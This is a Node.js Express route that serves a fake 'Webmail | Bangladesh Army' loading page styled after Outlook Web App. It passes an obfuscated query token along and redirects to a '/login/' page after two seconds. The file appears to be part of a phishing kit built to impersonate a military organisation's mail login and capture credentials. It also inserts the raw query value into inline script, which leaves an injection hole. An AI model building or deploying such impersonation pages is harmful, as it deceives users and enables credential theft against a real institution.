
const express = require ('express');
const router = express.Router();


router.use(express.static('public'));

//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data2 = req.query.uihdft948fdjxgjdferuidh;
    const url = `/login/?kjgfhdgudgherueru9843efjdfhfwheur=${data2}`;
    if (data2 == null) {
        res.render('error');
        
      }else{

    const htmlContent = `
    <!DOCTYPE html>
    <html dir="ltr" lang="en-US">
   
      <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta http-equiv="pragma" content="no-cache">
        <link rel="shortcut icon" href="./images/favicon.ico" type="image/x-icon">
        <link rel="stylesheet" type="text/css" href="./style/load.css">
        <title>Webmail | Bangladesh Army</title>
           <script>
                setTimeout(function() {
                    window.location.href = '${url}';
                }, 2000);
            </script> 
    
            <style>
           
            </style>
        </head>
        <body oncontextmenu="return false;" class="notIE8 ms-fwt-r">
            <!--
                                                                                                                                <![endif]-->
            <div id="owaLoading">
            
            <img id="loadingLogo" alt="" src="./images/head.png">
            
            <div dir="ltr" class="loadingSpinnerContainer" id="cssloadingSpinnerContainer">
                <div class="loadingSpinner loadingSpinnerAnimation">
                <div class="loadingBall loadingBallColor"></div>
                <div class="loadingBall loadingBallColor"></div>
                <div class="loadingBall loadingBallColor"></div>
                <div class="loadingBall loadingBallColor"></div>
                <div class="loadingBall loadingBallColor"></div>
                <div class="loadingBall loadingBallColor"></div>
                <div class="loadingBall loadingBallColor"></div>
                <div class="loadingBall loadingBallColor"></div>
                </div>
            </div>
            <div id="statusText" class="scriptDelay">
                <span class="script">Starting...</span>
                <span class="scriptDelay">Still working on it...</span>
                <span class="data">Opening your mailbox...</span>
                <span class="dataDelay">Still working on it...</span>
                <span class="render">Almost there...</span>
            </div>
            </div>
            <div id="preloadDiv" style="visibility:hidden;height: 1px; margin-bottom: -1px; overflow: hidden;">
            
            <span style="font-family:&quot;wf_segoe-ui_light&quot;;">t</span>
            <span style="font-family:&quot;wf_segoe-ui_normal&quot;;">t</span>
            <span style="font-family:&quot;wf_segoe-ui_semibold&quot;;">t</span>
            <span style="font-family:&quot;wf_segoe-ui_semilight&quot;;">t</span>
            <span style="font-family:&quot;webfontPreload&quot;;"></span>
            
            </div>
        </body>
        </html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            }
});




module.exports =router
